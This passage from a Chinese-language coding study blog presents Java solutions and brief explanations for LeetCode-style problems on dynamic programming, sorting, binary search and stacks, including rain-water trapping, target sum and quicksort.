class="line"></span><br><span class="line"><span class="comment">// 双指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> height.length - <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max_left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max_right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (height[left - <span class="number">1</span>] &lt; height[right + <span class="number">1</span>]) &#123;</span><br><span class="line">                max_left = Math.max(max_left, height[left - <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (max_left &gt; height[left]) &#123;</span><br><span class="line">                    sum = sum + max_left - height[left];</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max_right = Math.max(max_right, height[right + <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (max_right &gt; height[right]) &#123;</span><br><span class="line">                    sum = sum + max_right - height[right];</span><br><span class="line">                &#125;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 栈</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (current &lt; height.length) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.empty() &amp;&amp; height[current] &gt; height[stack.peek()]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> height[stack.peek()];</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="keyword">if</span> (stack.empty()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">distance</span> <span class="operator">=</span> current - stack.peek() - <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(height[stack.peek()], height[current]);</span><br><span class="line">                sum = sum + distance * (min - h);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(current);</span><br><span class="line">            current++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="494-目标和-x2F"><a href="#494-目标和-x2F" class="headerlink" title="494. 目标和&#x2F;"></a><a href="https://leetcode-cn.com/problems/target-sum/">494. 目标和</a>&#x2F;</h3><h4 id="方法一-动态规划"><a href="#方法一-动态规划" class="headerlink" title="方法一:动态规划"></a>方法一:动态规划</h4><p>找到nums一个正子集和一个负子集，使得总和等于target</p>
<p>我们假设P是正子集，N是负子集 例如： 假设nums &#x3D; [1, 2, 3, 4, 5]，target &#x3D; 3，一个可能的解决方案是+1-2+3-4+5 &#x3D; 3 这里正子集P &#x3D; [1, 3, 5]和负子集N &#x3D; [2, 4]</p>
<p>转化为背包问题,背包能放P个,然后怎么放.</p>
<p> dp[i]代表的含义是从nums中取数相加和为i时有多少种取法.</p>
<p>dp[0]&#x3D;1 其实已经是将题目转化成0&#x2F;1背包问题了，好比背包里面怎么放钱恰好放到8块钱，假如恰好放到0元，应该就是不放钱到背包这种情况了，所以只有一种情况，所以dp[0]&#x3D;1，没转化成01背包问题的时候 dp[0]&#x3D;1肯定不成立的！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                  sum(P) - sum(N) = target</span><br><span class="line">sum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N)</span><br><span class="line">                       2 * sum(P) = target + sum(nums)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> S)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((S + sum) % <span class="number">2</span> ==  <span class="number">1</span> || sum &lt; S) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> func(nums, (S + sum) &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> s)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[s + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> s; j &gt;= n; j--) &#123;</span><br><span class="line">                dp[j] += dp[j - n];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-47-礼物的最大价值"><a href="#剑指-Offer-47-礼物的最大价值" class="headerlink" title="剑指 Offer 47. 礼物的最大价值"></a><a href="https://leetcode-cn.com/problems/li-wu-de-zui-da-jie-zhi-lcof/">剑指 Offer 47. 礼物的最大价值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxValue</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>][j + <span class="number">1</span>] = Math.max(dp[i][j + <span class="number">1</span>], dp[i + <span class="number">1</span>][j]) + grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="300-最长上升子序列"><a href="#300-最长上升子序列" class="headerlink" title=" 300. 最长上升子序列"></a><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence"> 300. 最长上升子序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> len;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        Arrays.fill(dp, <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> dp[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    dp[i] = Math.max(dp[j] + <span class="number">1</span>, dp[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Math.max(res, dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="718-最长重复子数组"><a href="#718-最长重复子数组" class="headerlink" title="718. 最长重复子数组"></a><a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/">718. 最长重复子数组</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLength</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums1[i - <span class="number">1</span>] == nums2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                    max = Math.max(max, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="628-三个数的最大乘积-x2F-x2F"><a href="#628-三个数的最大乘积-x2F-x2F" class="headerlink" title="628. 三个数的最大乘积&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/maximum-product-of-three-numbers/">628. 三个数的最大乘积</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先排序</span></span><br><span class="line"><span class="comment">// 如果数组中全是非负数，则排序后最大的三个数相乘即为最大乘积；如果全是非正数，则最大的三个数相乘同样也为最大乘积。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果数组中有正数有负数，则最大乘积既可能是三个最大正数的乘积，也可能是两个最小负数（即绝对值最大）与最大正数的乘积。</span></span><br><span class="line"><span class="comment">//求出三个最大正数的乘积，以及两个最小负数与最大正数的乘积，二者之间的最大值即为所求答案。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="keyword">return</span> Math.max(nums[<span class="number">0</span>]*nums[<span class="number">1</span>]*nums[n-<span class="number">1</span>], nums[n-<span class="number">3</span>]*nums[n-<span class="number">2</span>]*nums[n-<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线性扫描</span></span><br><span class="line"><span class="comment">// 只要求出数组中最大的三个数以及最小的两个数，可以不用排序，用线性扫描直接得出这五个数。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">min1</span> <span class="operator">=</span> Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;</span><br><span class="line">    <span class="type">int</span> <span class="variable">max1</span> <span class="operator">=</span> Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &lt; min1) &#123;</span><br><span class="line">        min2 = min1;</span><br><span class="line">        min1 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; min2) &#123;</span><br><span class="line">        min2 = x;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (x &gt; max1) &#123;</span><br><span class="line">      	max3 = max2;</span><br><span class="line">        max2 = max1;</span><br><span class="line">        max1 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max2) &#123;</span><br><span class="line">        max3 = max2;</span><br><span class="line">        max2 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max3) &#123;</span><br><span class="line">        max3 = x;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Math.max(min1 * min2 * max1, max3 * max2 * max1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="324-摆动排序-II-x2F"><a href="#324-摆动排序-II-x2F" class="headerlink" title="324. 摆动排序 II&#x2F;"></a><a href="https://leetcode-cn.com/problems/wiggle-sort-ii/">324. 摆动排序 II</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 尽量将小数部分的最大数放在边上，这样只用靠近一个大数部分的最大数。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wiggleSort</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] help = nums.clone();</span><br><span class="line">        Arrays.sort(help);</span><br><span class="line">        <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> nums.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            nums[i] = help[--N];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            nums[i] = help[--N];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="排序-NC140-x2F"><a href="#排序-NC140-x2F" class="headerlink" title="排序(NC140)&#x2F;"></a><a href="https://www.nowcoder.com/practice/2baf799ea0594abd974d37139de27896?tpId=196&rp=1&ru=/ta/job-code-total&qru=/ta/job-code-total/question-ranking&tab=answerKey">排序(NC140)</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] MySort (<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quicksort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> end;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt;= temp) j--;</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt;= temp) i++;</span><br><span class="line">            arr[j] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        arr[i] = temp;</span><br><span class="line">        quickSort(arr, start, i - <span class="number">1</span>);</span><br><span class="line">        quickSort(arr, i + <span class="number">1</span>, end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-21-调整数组顺序使奇数位于偶数前面"><a href="#剑指-Offer-21-调整数组顺序使奇数位于偶数前面" class="headerlink" title="剑指 Offer 21. 调整数组顺序使奇数位于偶数前面"></a><a href="https://leetcode-cn.com/problems/diao-zheng-shu-zu-shun-xu-shi-qi-shu-wei-yu-ou-shu-qian-mian-lcof/">剑指 Offer 21. 调整数组顺序使奇数位于偶数前面</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] exchange(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[left];</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                nums[right] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-53-I-在排序数组中查找数字-I"><a href="#剑指-Offer-53-I-在排序数组中查找数字-I" class="headerlink" title="剑指 Offer 53 - I. 在排序数组中查找数字 I"></a><a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/">剑指 Offer 53 - I. 在排序数组中查找数字 I</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二分, 注意&gt;&gt;的优先级比+号低, 会先算+,然后再&gt;&gt;; 所以得加括号</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (target == nums[mid]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> mid;</span><br><span class="line">                <span class="keyword">while</span> (left &lt; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[--i] != target) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                i = mid;</span><br><span class="line">                <span class="keyword">while</span> (right &gt; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[++i] != target) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="69-x-的平方根"><a href="#69-x-的平方根" class="headerlink" title=" 69. x 的平方根"></a><a href="https://leetcode-cn.com/problems/sqrtx"> 69. x 的平方根</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> x / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// x = 4的时候会死循环</span></span><br><span class="line">            <span class="comment">//int mid = left + ((right - left) &gt;&gt; 1);</span></span><br><span class="line">            <span class="comment">// 避免乘法溢出</span></span><br><span class="line">            <span class="keyword">if</span> (mid == x / mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (mid &gt; x / mid) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title=" 704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search"> 704. 二分查找</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[<span class="number">0</span>] || target &gt; nums[nums.length - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + ((r - l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="20-有效的括号-x2F-x2F"><a href="#20-有效的括号-x2F-x2F" class="headerlink" title="20. 有效的括号&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/valid-parentheses/">20. 有效的括号</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> 